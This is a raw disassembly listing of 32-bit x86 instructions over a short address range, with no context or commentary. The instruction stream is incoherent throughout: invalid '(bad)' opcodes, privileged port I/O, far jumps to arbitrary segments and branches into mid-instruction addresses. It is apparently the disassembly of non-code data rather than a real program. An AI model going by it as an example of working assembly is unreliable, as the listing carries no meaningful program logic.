  43661a:	fist   DWORD PTR [edx]
  43661c:	ret    0x4a39
  43661f:	das    
  436620:	stos   BYTE PTR es:[edi],al
  436621:	inc    ebp
  436622:	cdq    
  436623:	(bad)  [ecx+0x37081d02]
  436629:	jle    0x4365d9
  43662b:	sahf   
  43662c:	add    DWORD PTR [ebx],ecx
  43662e:	xchg   BYTE PTR [edi],dl
  436630:	push   ecx
  436631:	or     al,BYTE PTR [esi]
  436633:	cmp    ebp,edi
  436635:	inc    ecx
  436636:	mov    bh,0x7a
  436638:	mov    esp,0xdf8a0ec8
  43663d:	xchg   ebp,eax
  43663e:	inc    esi
  43663f:	fisttp QWORD PTR [edx+0x33]
  436642:	sub    esp,DWORD PTR [eax-0x4602ef7b]
  436648:	xchg   edi,eax
  436649:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43664a:	clc    
  43664b:	es lahf 
  43664d:	mov    ah,0x78
  43664f:	jbe    0x436663
  436651:	sub    al,0x1c
  436653:	push   eax
  436654:	adc    DWORD PTR [esi+0x44],0x7d
  436658:	cdq    
  436659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43665a:	lods   eax,DWORD PTR ds:[esi]
  43665b:	mov    bl,0x92
  43665d:	shl    DWORD PTR [edx+eiz*1],1
  436660:	mov    bh,0xe8
  436662:	mov    WORD PTR [eax-0xe706ce7],cs
  436668:	fwait
  436669:	imul   eax,DWORD PTR [eax-0x6c],0x2ba30460
  436670:	lods   al,BYTE PTR ds:[esi]
  436671:	in     al,0x2e
  436673:	out    0x6d,al
  436675:	sbb    edx,DWORD PTR ds:0xfbb31c5
  43667b:	(bad)  
  43667d:	aad    0x24
  43667f:	push   ds
  436680:	outs   dx,DWORD PTR ds:[esi]
  436681:	adc    DWORD PTR [ebp-0x1f59ac3e],esi
  436687:	xor    ch,dh
  436689:	out    dx,eax
  43668a:	leave  
  43668b:	dec    ecx
  43668c:	and    eax,DWORD PTR [ebx]
  43668e:	mov    esi,0x16ad8062
  436693:	imul   ebx,ebp,0xffffff8e
  436696:	fcmovnbe st,st(6)
  436698:	mov    ds:0x554b9a7e,al
  43669d:	retf   
  43669e:	mov    bl,0x52
  4366a0:	cmc    
  4366a1:	neg    DWORD PTR [eax]
  4366a3:	jmp    0xdb45:0x8fd89739
  4366aa:	call   0x6c04:0xdd8b5184
  4366b1:	test   BYTE PTR [edi+0x14d5485e],cl
  4366b7:	cmp    al,0x6b
  4366b9:	and    eax,0xeced9137
  4366be:	je     0x436695
  4366c0:	outs   dx,DWORD PTR ds:[esi]
  4366c1:	jmp    0x2173612d
  4366c6:	cmp    DWORD PTR [eax-0x705e44b5],esi
  4366cc:	or     bl,BYTE PTR [eax]
  4366ce:	ret    
  4366cf:	mov    eax,ds:0xd73274fb
  4366d4:	mov    eax,0x31fd87de
  4366d9:	es pop ds
  4366db:	or     bl,bl
  4366dd:	in     al,0x1c
  4366df:	pushf  
  4366e0:	pop    edx
  4366e1:	push   esi
  4366e2:	pop    edx
  4366e3:	mov    bl,0xb0
  4366e5:	push   esp
  4366e6:	mov    ds:0x2af569f4,al
  4366eb:	jb     0x43671e
  4366ed:	shl    BYTE PTR [edx-0x2a],0xfe
  4366f1:	hlt    
  4366f2:	push   esi
  4366f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4366f4:	out    dx,eax
  4366f5:	jp     0x4366e1
  4366f7:	pop    edx
  4366f8:	fisub  WORD PTR [eax-0x7a082563]
  4366fe:	aaa    
  4366ff:	add    dh,BYTE PTR [edi]
  436701:	xchg   ecx,eax
  436702:	popa   
  436703:	mov    esp,0x16cab6b9
  436708:	imul   edi,DWORD PTR [ecx+ebx*4-0x1cb60593],0xc6dd3cb
  436713:	push   eax
  436714:	mov    ah,0xf5
  436716:	fmul   QWORD PTR [ebx+0x1d]
  436719:	ret    
  43671a:	inc    ecx
  43671b:	push   ecx
  43671c:	cmp    ebx,edi
  43671e:	(bad)  
  436720:	inc    edx
  436721:	les    eax,FWORD PTR [ecx]
  436723:	icebp  
  436724:	popa   
  436725:	jbe    0x43673b
  436727:	mov    ecx,DWORD PTR [ebp-0x10]
  43672a:	push   edx
  43672b:	imul   edi,DWORD PTR [edi-0x8],0xffffff82
  43672f:	fbld   TBYTE PTR ds:[eax+0xeb1f14b]
  436736:	int    0x7b
  436738:	ja     0x436746
  43673a:	clc    
  43673b:	out    dx,al
  43673c:	dec    ecx
  43673d:	stos   DWORD PTR es:[edi],eax
  43673e:	es mov ah,cl
  436741:	xchg   DWORD PTR [eax],ebp
  436743:	inc    edi
  436744:	(bad)  
  436746:	xchg   ebx,eax
  436747:	retf   
  436748:	clc    
  436749:	ins    DWORD PTR es:[edi],dx
  43674a:	xchg   esi,eax
  43674b:	fsubr  st,st(2)
  43674d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43674e:	mov    ds:0x9c16887f,al
  436753:	pushf  
  436754:	clc    
  436755:	enter  0x822,0xd2
  436759:	jg     0x436735
  43675b:	ret    
  43675c:	(bad)  
  43675d:	cmc    
  43675e:	inc    esi
  43675f:	push   eax
  436760:	scas   eax,DWORD PTR es:[edi]
  436761:	cld    
  436762:	stos   DWORD PTR es:[edi],eax
  436763:	and    eax,0x21c67a8a
  436768:	popf   
  436769:	add    al,0xba
  43676b:	sbb    edx,ebx
  43676d:	xor    BYTE PTR [ebx-0x6b3e32df],dl
  436773:	mov    gs,esp
  436775:	mov    gs,WORD PTR [edx+esi*4-0x3c]
  436779:	imul   esi,esi,0x61
  43677c:	and    DWORD PTR [ecx+0x496bd15f],edi
  436782:	std    
  436783:	xlat   BYTE PTR ds:[ebx]
  436784:	lock mov eax,0x7494341c
  43678a:	sbb    edi,ebp
  43678c:	adc    DWORD PTR [ecx+0x8558224],esi
  436792:	sub    BYTE PTR [ecx+0x5057e38f],0xcf
  436799:	sub    al,0xf3
  43679b:	xchg   esp,eax
  43679c:	jge    0x436813
  43679e:	sbb    BYTE PTR [ebp-0x377879da],ch
  4367a4:	jecxz  0x43676d
  4367a6:	out    0x93,eax
  4367a8:	fisttp DWORD PTR [edi+0x35327dbe]
  4367ae:	cmp    eax,0xd3210055
  4367b3:	inc    ebp
  4367b4:	xchg   ecx,eax
  4367b5:	cmc    
  4367b6:	lea    eax,[ecx+eax*8-0x439834f4]
  4367bd:	pop    esp
  4367be:	ins    DWORD PTR es:[edi],dx
  4367bf:	push   cs
  4367c0:	scas   eax,DWORD PTR es:[edi]
  4367c1:	and    BYTE PTR [edx],ah
  4367c3:	mov    al,0xda
  4367c5:	cmc    
  4367c6:	fstp   DWORD PTR ds:0x6d69c5f8
  4367cc:	mov    ch,0x32
  4367ce:	sub    edx,edi
  4367d0:	lock mov ah,0x2e
  4367d3:	jns    0x436840
  4367d5:	(bad)  
  4367d6:	das    
  4367d7:	jb     0x4367f9
  4367d9:	lods   al,BYTE PTR ds:[esi]
  4367da:	or     eax,edi
  4367dc:	lock push ss
  4367de:	pop    ebx
  4367df:	and    al,0x7a
  4367e1:	add    BYTE PTR [edx+0x45db37a1],bh
  4367e7:	jmp    0x96e5afe0
  4367ec:	jmp    0x43679b
  4367ee:	xor    al,0x85
  4367f0:	scas   eax,DWORD PTR es:[edi]
  4367f1:	icebp  
  4367f2:	lock mov edx,0xa0a2accf
  4367f8:	call   0x629a:0xec0a4a11
  4367ff:	mov    esp,0x6b3f8663
  436804:	dec    esi
  436805:	popf   
  436806:	dec    edx
  436807:	or     al,0x66
  436809:	mov    edx,0xd89ab98a
  43680e:	cmc    
  43680f:	inc    esi
  436810:	mov    dl,BYTE PTR ss:[ecx]
  436813:	test   al,0x7d
  436815:	xlat   BYTE PTR ds:[ebx]
  436816:	mov    bl,0x59
  436818:	rcl    DWORD PTR [ecx-0x31],0x78
  43681c:	jmp    0x6389:0x26e69307
  436823:	mov    ebx,0x34f54d73
  436828:	jecxz  0x4367f6
  43682a:	dec    esi
  43682b:	add    edx,ecx
  43682d:	push   ebx
  43682e:	adc    DWORD PTR [ebx+0x668ff72b],eax
  436834:	retf   
  436835:	and    ebp,DWORD PTR [esi]
  436837:	shl    BYTE PTR ds:0x1dccbd77,cl
  43683d:	or     edx,ecx
  43683f:	test   BYTE PTR [edx-0x27],0x6
  436843:	jns    0x436830
  436845:	mov    eax,0xddb2577f
  43684a:	or     BYTE PTR [edi],bl
  43684c:	dec    ebx
  43684d:	xchg   edi,eax
  43684e:	jp     0x436874
  436850:	sahf   
  436851:	mov    ah,0x88
  436853:	lods   al,BYTE PTR ds:[esi]
  436854:	or     DWORD PTR [ebx+ecx*4-0x3f],eax
  436858:	pushf  
  436859:	shl    DWORD PTR [edi+ecx*1],cl
  43685c:	(bad)  
  43685d:	out    dx,eax
  43685e:	les    ebp,FWORD PTR [esi+edi*2+0x4ceb7a0b]
  436865:	jge    0x4368ad
  436867:	or     DWORD PTR [eax+0x27d26f4],eax
  43686d:	pop    ds
  43686e:	(bad)  
  43686f:	out    dx,eax
  436870:	pushf  
  436871:	(bad)  
  436872:	(bad)  
  436873:	mov    esp,0x1a87092c
  436878:	sbb    ah,ch
  43687a:	adc    DWORD PTR [eax+ebp*2+0xb072eea],ecx
  436881:	into   
  436882:	outs   dx,DWORD PTR ds:[esi]
  436883:	mul    BYTE PTR [edx]
  436885:	fs lock ror ah,1
  436889:	push   0xf0b08fab
  43688e:	outs   dx,DWORD PTR ds:[esi]
  43688f:	sub    ah,BYTE PTR [esi]
  436891:	inc    edi
  436892:	mul    DWORD PTR [ecx+0x2447a064]
  436898:	push   edx
  436899:	outs   dx,DWORD PTR ds:[esi]
  43689a:	dec    esp
  43689b:	jne    0x43690f
  43689d:	xor    ah,BYTE PTR [edx]
  43689f:	pushf  
  4368a0:	xor    DWORD PTR [edx-0x6c],ebx
  4368a3:	xlat   BYTE PTR ds:[ebx]
  4368a4:	dec    edx
  4368a5:	mov    ds:0x460a7d3,al
  4368aa:	pop    esi
  4368ab:	hlt    
  4368ac:	lar    esi,WORD PTR [edx]
  4368af:	rcr    edi,0x2f
  4368b2:	cs xchg edi,eax
  4368b4:	mov    eax,0x3385ec1f
  4368b9:	mov    ?,ebx
  4368bb:	jge    0x4368f8
  4368bd:	cwde   
  4368be:	neg    DWORD PTR [edx]
  4368c0:	out    0xf5,al
  4368c2:	fild   QWORD PTR [ecx]
  4368c4:	mov    edx,cs
  4368c6:	aas    
  4368c7:	or     al,0xbe
  4368c9:	leave  
  4368ca:	pop    edi
  4368cb:	mov    bl,0x4d
  4368cd:	fs or  al,0xa8
  4368d0:	dec    ebx
  4368d1:	dec    edi
  4368d2:	lahf   
  4368d3:	adc    al,0x55
  4368d5:	rcl    BYTE PTR ds:0xff820d06,cl
  4368db:	pop    ebp
  4368dc:	pusha  
  4368dd:	push   esi
  4368de:	jbe    0x4368bb
  4368e0:	shl    bl,cl
  4368e2:	aaa    
  4368e3:	xor    DWORD PTR [ebp-0x1d2424e7],eax
  4368e9:	push   esi
  4368ea:	arpl   WORD PTR [ebx-0x3dfeb53d],dx
  4368f0:	js     0x4368f9
  4368f2:	pop    ds
  4368f3:	xchg   edx,eax
  4368f4:	or     eax,edx
  4368f6:	cs gs (bad) 
  4368f9:	sub    di,ax
  4368fc:	test   eax,0xb1f0a19
  436901:	adc    esp,eax
  436903:	adc    DWORD PTR [edx+eiz*1+0x11],edi
  436907:	cmp    eax,0xf5a4abe8
  43690c:	das    
  43690d:	cmc    
  43690e:	lock push 0x8e858831
  436914:	je     0x4368eb
  436916:	ins    DWORD PTR es:[edi],dx
  436917:	retf   0xc55d
  43691a:	mov    ebx,0xe469bcc7
  43691f:	pop    esp
  436920:	pushf  
  436921:	mov    esi,0x101f8e24
  436926:	jge    0x43697c
  436928:	loop   0x4368e8
  43692a:	sbb    DWORD PTR [ebx],0x16
  43692d:	jge    0x436939
  43692f:	push   esp
  436930:	sar    BYTE PTR [edx+0x710c4909],0x8f
  436937:	lea    edx,[ebp+0x42]
  43693a:	addr16 call 0x65fc:0xfc3f46b2
  436942:	outs   dx,DWORD PTR ds:[esi]
  436943:	dec    ebx
  436944:	inc    eax
  436945:	fstp   DWORD PTR [edx+0x7b119ad5]
  43694b:	adc    esi,ebx
  43694d:	das    
  43694e:	jle    0x436999
  436950:	into   
  436951:	and    ebp,ebx
  436953:	pop    es
  436954:	imul   esp,esi,0x14
  436957:	inc    ebx
  436958:	sbb    eax,0x4e60bd9b
  43695d:	ror    bl,cl
  43695f:	mov    al,0xa7
  436961:	cmc    
  436962:	jecxz  0x4369b5
  436964:	arpl   cx,si
  436966:	sub    al,0x8b
  436968:	ds iret 
  43696a:	mov    al,ds:0xdc2161c1
  43696f:	xlat   BYTE PTR ds:[ebx]
  436970:	shl    DWORD PTR [esp+ebp*4+0x25],cl
  436974:	sti    
  436975:	mov    dl,0x6e
  436977:	lahf   
  436978:	push   es
  436979:	(bad)  
  43697a:	dec    eax
  43697b:	mov    DWORD PTR [esi-0x10120f02],edx
  436981:	push   cs
  436982:	loope  0x43690c
  436984:	push   eax
  436985:	icebp  
  436986:	mov    bl,0xb0
  436988:	std    
  436989:	lods   eax,DWORD PTR ds:[esi]
  43698a:	aad    0xe5
  43698c:	arpl   sp,di
  43698e:	loop   0x4369ea
  436990:	outs   dx,BYTE PTR ds:[esi]
  436991:	inc    ebp
  436992:	lds    ecx,FWORD PTR [esi-0x1376f0f6]
  436998:	pop    ebp
  436999:	(bad)  
  43699a:	out    dx,al
  43699b:	mov    edi,0x6ec89f
  4369a0:	sub    BYTE PTR [eax-0x8],0xe5
  4369a4:	cmp    DWORD PTR [esi-0x2a],edi
  4369a7:	xchg   ecx,eax
  4369a8:	jle    0x436a1e
  4369aa:	sub    al,0x28
  4369ac:	mov    al,0x77
  4369ae:	mov    ds:0xf9eaed3c,al
  4369b3:	or     BYTE PTR [edx],0x37
  4369b6:	lea    esp,[esi+0x2fec1ca5]
  4369bc:	add    BYTE PTR [ebx+ebx*2],bl
  4369bf:	std    
  4369c0:	jle    0x436943
  4369c2:	das    
  4369c3:	sar    BYTE PTR ds:0xebc417bd,1
  4369c9:	je     0x436977
  4369cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4369cc:	push   ebp
  4369cd:	es call 0x228cb29a
  4369d3:	retf   
  4369d4:	sub    ecx,esp
  4369d6:	pop    ds
  4369d7:	ret    
  4369d8:	ins    BYTE PTR es:[edi],dx
  4369d9:	cmp    BYTE PTR [edi+0x14346f06],dl
  4369df:	jno    0x436a24
  4369e1:	hlt    
  4369e2:	push   ecx
  4369e3:	xlat   BYTE PTR ds:[ebx]
  4369e4:	stos   DWORD PTR es:[edi],eax
  4369e5:	xor    eax,0x9295e52
  4369ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4369ec:	mov    dh,0x3e
  4369ee:	loopne 0x436a42
  4369f0:	test   bl,bl
  4369f2:	call   0x35ccf1bf
  4369f7:	adc    al,0xe6
  4369f9:	repnz pop edi
  4369fb:	pop    edi
  4369fc:	jl     0x436999
  4369fe:	mov    eax,ds:0x379faeba
  436a03:	adc    DWORD PTR [eax+0x4],ebx
  436a06:	adc    BYTE PTR [eax+0x72],dh
  436a09:	not    DWORD PTR [eax+0x6d]
  436a0c:	sar    BYTE PTR [ecx+0x26832b8],1
  436a12:	xchg   edi,eax
  436a13:	nop
  436a14:	xchg   ecx,eax
  436a15:	add    dl,BYTE PTR [edx+0x54]
  436a18:	in     al,dx
  436a19:	std    
  436a1a:	(bad)  
  436a1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436a1c:	mov    gs,WORD PTR [edx+0x55c141c4]
  436a22:	add    bl,BYTE PTR [ecx-0x516d4fe1]
  436a28:	pop    ss
  436a29:	inc    ecx
  436a2a:	or     eax,0x4d63f3dd
  436a2f:	adc    eax,DWORD PTR [ecx]
  436a31:	push   esp
  436a32:	popa   
  436a33:	mov    ecx,0xc7f3ba41
  436a38:	enter  0xdaf4,0x4d
  436a3c:	cli    
  436a3d:	mov    ah,0xc7
  436a3f:	imul   esi,ecx,0xfd9754e0
  436a45:	cmc    
  436a46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436a47:	push   ebx
  436a48:	cmc    
  436a49:	or     cl,dl
  436a4b:	pop    ebx
  436a4c:	pushf  
  436a4d:	pop    ecx
  436a4e:	mov    al,0x61
  436a50:	inc    esp
  436a51:	jbe    0x436ace
  436a53:	mov    ch,0xce
  436a55:	out    0x91,al
  436a57:	lds    edx,FWORD PTR [eax-0xc68d3c1]
  436a5d:	add    cl,0x39
  436a60:	jp     0x4369ee
  436a62:	(bad)
  436a65:	add    edi,DWORD PTR [ecx+0x4f1f029d]
  436a6b:	pop    DWORD PTR [eax+0x6443ec58]
  436a71:	lods   al,BYTE PTR ds:[esi]
  436a72:	pop    ecx
  436a73:	clc    
  436a74:	fstp   TBYTE PTR [ebx]
  436a76:	jmp    0x3d1d74b1
  436a7b:	push   edi
  436a7c:	pop    ecx
  436a7d:	and    al,0xcc
  436a7f:	ficom  DWORD PTR [edx*8+0x4dc0a1cb]
  436a86:	repnz out dx,al
  436a88:	popa   
  436a89:	cmc    
  436a8a:	sbb    eax,0xcf4933c
  436a8f:	xchg   ebp,eax
  436a90:	adc    DWORD PTR [ebp*1-0x7a9e2bbc],edx
  436a97:	inc    sp
  436a99:	sbb    edx,DWORD PTR [edi-0x1c]
  436a9c:	push   ebx
  436a9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436a9e:	xor    dl,dh
  436aa0:	xchg   ebp,eax
  436aa1:	pop    ebx
  436aa2:	add    eax,0x3fa2ed84
  436aa7:	popa   
  436aa8:	push   ss
  436aa9:	ret    0x19f2
  436aac:	fmul   QWORD PTR [ecx+0x0]
  436aaf:	or     DWORD PTR [edx],esp
  436ab1:	jmp    0xb1b:0xc2410265
  436ab8:	(bad)  
  436ab9:	shl    dh,cl
  436abb:	inc    esp
  436abc:	dec    ecx
  436abd:	xchg   ebx,eax
  436abe:	or     ah,BYTE PTR [esi-0x7]
  436ac1:	and    al,0x95
  436ac3:	push   eax
  436ac4:	dec    edi
  436ac5:	addr16 push edx
  436ac7:	and    al,0x35
  436ac9:	xchg   esp,eax
  436aca:	sti    
  436acb:	mov    esp,0x48453499
  436ad0:	mov    esp,0x91dc029d
  436ad5:	xor    eax,0x6fc47c4b
  436ada:	xchg   edx,eax
  436adb:	push   ecx
  436adc:	mov    eax,0x48d9749f
  436ae1:	inc    DWORD PTR [ecx+edi*4-0x46b86cd1]
  436ae8:	bnd jbe 0x436a6c
  436aeb:	dec    ebx
  436aec:	cmc    
  436aed:	inc    ecx
  436aee:	pop    ds
  436aef:	ins    DWORD PTR es:[edi],dx
  436af0:	mov    ebp,0x7dd6681c
  436af5:	mov    ds:0xc34497fe,al
  436afa:	mov    bh,0xbd
  436afc:	lds    ebp,FWORD PTR [ebp-0x75]
  436aff:	or     ecx,DWORD PTR [edi+eiz*4-0xbb62cdd]
  436b06:	(bad)  
  436b07:	xor    ch,BYTE PTR [esi-0x28572458]
  436b0d:	aas    
  436b0e:	mov    ch,0x5
  436b10:	loope  0x436b79
  436b12:	push   ecx
  436b13:	repnz dec ecx
  436b15:	sub    ebp,edx
  436b17:	cwde   
  436b18:	mov    DWORD PTR [esi-0x11],ebx
  436b1b:	shl    cl,cl
  436b1d:	jno    0x436b9c
  436b1f:	fidiv  WORD PTR [edi+ebp*4-0x2]
  436b23:	les    edi,FWORD PTR [eax+0x19]
  436b26:	push   es
  436b27:	mov    es,WORD PTR [ecx]
  436b29:	push   edi
  436b2a:	out    dx,al
  436b2b:	cmp    BYTE PTR [ecx+0x56],dh
  436b2e:	adc    BYTE PTR [ecx],bh
  436b30:	in     al,dx
  436b31:	(bad)  
  436b32:	cli    
  436b33:	mov    esi,0x21a44cd1
  436b38:	push   eax
  436b39:	cmc    
  436b3a:	push   es
  436b3b:	gs std 
  436b3d:	(bad)
  436b40:	mov    dh,0x69
  436b42:	sbb    BYTE PTR [edi-0x12],bl
  436b45:	push   0xffffffa9
  436b47:	xchg   edi,eax
  436b48:	mov    BYTE PTR [edi],0x65
  436b4b:	rol    BYTE PTR [edi+0x13473590],0x92
  436b52:	fstp   QWORD PTR [edi-0x3e]
  436b55:	aas    
  436b56:	push   cs
  436b57:	fimul  WORD PTR [edi]
  436b59:	inc    ebx
  436b5a:	or     eax,0x70db4611
  436b5f:	xsha256 (bad)
  436b60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436b61:	aad    0x21
  436b63:	adc    bl,BYTE PTR [esi-0x12]
  436b66:	sub    al,0xc0
  436b68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436b69:	gs arpl di,cx
  436b6c:	jae    0x436afe
  436b6e:	and    al,0xfd
  436b70:	ds cdq 
  436b72:	pop    ds
  436b73:	xor    al,0x76
  436b75:	lea    esi,[ebp+0x32c46c3a]
  436b7b:	inc    esi
  436b7c:	mov    BYTE PTR [edi+0x0],bh
  436b7f:	xchg   ecx,eax
  436b80:	jecxz  0x436ba2
  436b82:	mov    eax,ds:0x19cef3cc
  436b87:	(bad)  
  436b88:	test   al,0x2c
  436b8a:	lahf   
  436b8b:	fs ins DWORD PTR es:[edi],dx
  436b8d:	stos   DWORD PTR es:[edi],eax
  436b8e:	fiadd  WORD PTR [edi]
  436b90:	aas    
  436b91:	add    DWORD PTR [ebx+eax*4+0x21492ceb],edi
  436b98:	adc    eax,0x4fc1d13f
  436b9d:	data16 cmp al,0x37
  436ba0:	add    BYTE PTR [edx+0x27],0x82
  436ba4:	aam    0x72
  436ba6:	bound  ebx,QWORD PTR [ebp+ebp*2-0x342b7aa1]
  436bad:	mov    ds:0xb112ccda,al
  436bb2:	sub    al,0xfa
  436bb4:	bound  esi,QWORD PTR [ebx-0x5726b881]
  436bba:	push   edi
  436bbb:	mov    dl,0x8
  436bbd:	aad    0x82
  436bbf:	push   eax
  436bc0:	xor    al,0x40
  436bc2:	in     al,dx
  436bc3:	(bad)  
  436bc4:	push   si
  436bc6:	imul   esi,DWORD PTR ds:0x18a2f87e,0xfc3224d1
  436bd0:	pop    esp
  436bd1:	mov    esp,0x9a47d58
  436bd6:	pop    eax
  436bd7:	mov    edx,DWORD PTR [edx-0x342b4c5]
  436bdd:	sbb    al,0x74
  436bdf:	mov    ebp,0xb933a3dd
  436be4:	pop    edx
  436be5:	icebp  
  436be6:	lea    edx,ds:0xf944bb68
  436bec:	sub    cl,cl
  436bee:	xchg   BYTE PTR [edx-0x1f],bl
  436bf1:	in     al,dx
  436bf2:	add    eax,0x5a0e212f
  436bf7:	cmp    al,0xb
  436bf9:	lock les esp,FWORD PTR [edx-0x5d]
  436bfd:	shl    DWORD PTR [eax+ecx*8],1
  436c00:	rol    DWORD PTR [ebp-0xd253814],cl
  436c06:	dec    eax
  436c07:	mov    eax,ds:0x810488cd
  436c0c:	cmp    ch,al
  436c0e:	mov    ch,0xe6
  436c10:	sub    al,0xad
  436c12:	jge    0x436c7b
  436c14:	stos   DWORD PTR es:[edi],eax
  436c15:	jle    0x436bdb
  436c17:	or     eax,0x3c113472
  436c1c:	and    al,0x98
  436c1e:	imul   ecx,DWORD PTR [ebx+0x18e2cb95],0x91b36971
  436c28:	inc    esi
  436c29:	cmp    dl,BYTE PTR [edx+0x50]
  436c2c:	ds push eax
  436c2e:	adc    eax,0x176ba5c5
  436c33:	call   0xc443:0x68722b32
  436c3a:	fisttp DWORD PTR [esi]
  436c3c:	mov    ecx,0x2a636b72
  436c41:	push   cs
  436c42:	call   ebp
  436c44:	bound  edi,QWORD PTR [esi+0x757ff46e]
  436c4a:	scas   al,BYTE PTR es:[edi]
  436c4b:	pop    ds
  436c4c:	mov    DWORD PTR [ebx],edi
  436c4e:	dec    esi
  436c4f:	dec    edi
  436c50:	popa   
  436c51:	test   ebx,esi
  436c53:	mov    esp,0xf308f016
  436c58:	inc    esi
  436c59:	mov    ch,0x53
  436c5b:	outs   dx,DWORD PTR ds:[esi]
  436c5c:	push   es
  436c5d:	aad    0xb5
  436c5f:	scas   al,BYTE PTR es:[edi]
  436c60:	out    0x39,al
  436c62:	dec    edi
  436c63:	shr    BYTE PTR [ecx+0x6b],1
  436c66:	jg     0x436c1e
  436c68:	pop    eax
  436c69:	je     0x436c96
  436c6b:	sbb    bl,BYTE PTR [eax+0x4c]
  436c6e:	xor    DWORD PTR [ecx+esi*1+0x76],0xa292528f
  436c76:	jp     0x436cb4
  436c78:	sbb    ecx,ebp
  436c7a:	imul   ebp
  436c7c:	inc    ebx
  436c7d:	sbb    cl,BYTE PTR [ebx]
  436c7f:	inc    ecx
  436c80:	dec    edi
  436c81:	xlat   BYTE PTR ds:[ebx]
  436c82:	loop   0x436c0a
  436c84:	sbb    DWORD PTR [eax+0x35],ebx
  436c87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436c88:	test   ebp,edx
  436c8a:	xchg   bl,al
  436c8c:	icebp  
  436c8d:	cmp    BYTE PTR [esi],dh
  436c8f:	push   edx
  436c90:	out    dx,al
  436c91:	aaa    
  436c92:	popf   
  436c93:	mov    esi,0x3dbfe4a
  436c98:	ins    DWORD PTR es:[edi],dx
  436c99:	scas   eax,DWORD PTR es:[edi]
  436c9a:	cmp    eax,edi
  436c9c:	outs   dx,BYTE PTR ds:[esi]
  436c9d:	jmp    0x88f19bfd
  436ca2:	dec    eax
  436ca3:	scas   eax,DWORD PTR es:[edi]
  436ca4:	cmp    eax,DWORD PTR [edi]
  436ca6:	sbb    ecx,DWORD PTR [eax-0x5d413143]
  436cac:	jo     0x436cb0
  436cae:	xchg   ebp,eax
  436caf:	test   al,0x48
  436cb1:	jecxz  0x436cc5
  436cb3:	fst    DWORD PTR [eax]
  436cb5:	mov    ah,0xc5
  436cb7:	cli    
  436cb8:	xor    cl,BYTE PTR [ecx+0x20c2d12f]
  436cbe:	inc    edx
  436cbf:	or     esi,DWORD PTR [edx]
  436cc1:	popf   
  436cc2:	push   0x8
  436cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436cc5:	(bad)  
  436cc6:	(bad)  [esi]
  436cc8:	and    eax,0x6afc839c
  436ccd:	xchg   esi,eax
  436cce:	push   ds
  436ccf:	mov    dh,0x93
  436cd1:	fst    QWORD PTR [edi-0x1c81e9aa]
  436cd7:	xchg   edx,eax
  436cd8:	and    DWORD PTR [ecx-0x62],ebp
  436cdb:	pop    ebx
  436cdc:	inc    esi
  436cdd:	add    ebp,DWORD PTR [edx+edx*4+0x3c]
  436ce1:	sbb    ecx,DWORD PTR [ebx+0x78bdc85f]
  436ce7:	ret    
  436ce8:	outs   dx,DWORD PTR ds:[esi]
  436ce9:	pop    eax
  436cea:	xchg   esp,eax
  436ceb:	cmp    eax,0xff4f69e1
  436cf0:	xor    DWORD PTR [ebx-0x4668ed18],esi
  436cf6:	pop    ecx
  436cf7:	dec    ebx
  436cf8:	retf   0x97d2
  436cfb:	mov    dl,0xfa
  436cfd:	mov    al,0x18
  436cff:	and    ch,BYTE PTR [edx]
  436d01:	sbb    BYTE PTR [esp+esi*1+0x1e],bl
  436d05:	xor    BYTE PTR [edi+0x240cf32f],bl
  436d0b:	popf   
  436d0c:	jmp    0xe30e:0x77f67820
  436d13:	cmp    cl,ch
  436d15:	scas   eax,DWORD PTR es:[edi]
  436d16:	in     eax,0x4d
  436d18:	or     al,0x3c
  436d1a:	xchg   DWORD PTR [ebx+esi*1-0x4f96ce62],ebx
  436d21:	ficom  WORD PTR [ecx-0x75]
  436d24:	je     0x436cd2
  436d26:	mul    BYTE PTR [ebx+0x9]
  436d29:	pop    eax
  436d2a:	repz in al,0x4
  436d2d:	stos   BYTE PTR es:[edi],al
  436d2e:	out    dx,eax
  436d2f:	(bad)  
  436d30:	jne    0x436cdb
  436d32:	shl    dl,0xd1
  436d35:	dec    eax
  436d36:	xor    DWORD PTR [edi],eax
  436d38:	add    eax,0x4a97b0c8
  436d3d:	fiadd  WORD PTR [edx-0x65]
  436d40:	shr    bh,cl
  436d42:	out    dx,eax
  436d43:	sub    eax,DWORD PTR [edx]
  436d45:	push   edx
  436d46:	mov    bh,0x48
  436d48:	mov    bl,0x58
  436d4a:	jns    0x436cfc
  436d4c:	cmp    BYTE PTR [ecx-0x9c80867],cl
  436d52:	ins    DWORD PTR es:[edi],dx
  436d53:	aam    0x54
  436d55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436d56:	push   edx
  436d57:	add    eax,DWORD PTR [ecx+0x61d875d6]
  436d5d:	mov    ds:0x89335b7,al
  436d62:	mov    gs:0x1a35309f,eax
  436d68:	mov    ecx,0xb318c067
  436d6d:	jnp    0x436d74
  436d6f:	pop    edx
  436d70:	cmc    
  436d71:	popf   
  436d72:	ror    BYTE PTR [ecx+0x246bb7a8],0xe6
  436d79:	loope  0x436d0c
  436d7b:	sub    DWORD PTR [edi],ebp
  436d7d:	inc    eax
  436d7e:	inc    edi
  436d7f:	xor    al,0x3d
  436d81:	mov    esp,0xaf78e7b0
  436d86:	xor    dh,0x65
  436d89:	sub    BYTE PTR [edi+0x44],dl
  436d8c:	aas    
  436d8d:	icebp  
  436d8e:	mov    esi,0x9b1790b9
  436d93:	inc    ebp
  436d94:	iret   
  436d95:	sbb    DWORD PTR [eax-0x5c],ebp
  436d98:	mov    edi,0x57a7d156
  436d9d:	mov    eax,ds:0xaa9bc723
  436da2:	retf   0xb7f3
  436da5:	xchg   ebx,eax
  436da6:	dec    edi
  436da7:	(bad)  
  436da8:	sbb    eax,0x6760d726
  436dad:	mov    edi,DWORD PTR [esi]
  436daf:	or     al,BYTE PTR [edi+0x779eb426]
